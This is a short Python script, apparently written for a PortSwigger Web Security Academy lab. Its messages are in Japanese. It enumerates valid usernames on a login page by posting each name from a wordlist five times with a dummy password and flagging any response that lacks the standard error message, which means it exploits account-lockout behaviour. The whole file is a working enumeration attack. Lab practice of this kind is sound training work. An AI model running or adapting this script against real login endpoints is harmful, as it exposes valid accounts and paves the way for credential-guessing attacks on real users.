import requests

URL = 'https://0a74005e04dd7a98832e5c1c004f00da.web-security-academy.net/login'
normal_error = 'Invalid username or password.'

with open('usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

print('[*] ユーザー名の列挙を開始します！')

session = requests.Session()

for username in usernames:
    is_valid_user = False

    for i in range(5):
        data = {
            'username': username,
            'password': 'a'
        }

        try:
            response = session.post(URL, data=data, timeout=5)

            if normal_error not in response.text:
                is_valid_user = True
                break

        except Exception:
            break

    status_icon = '○' if is_valid_user else '✕'
    print(f'{username:20} → {status_icon}')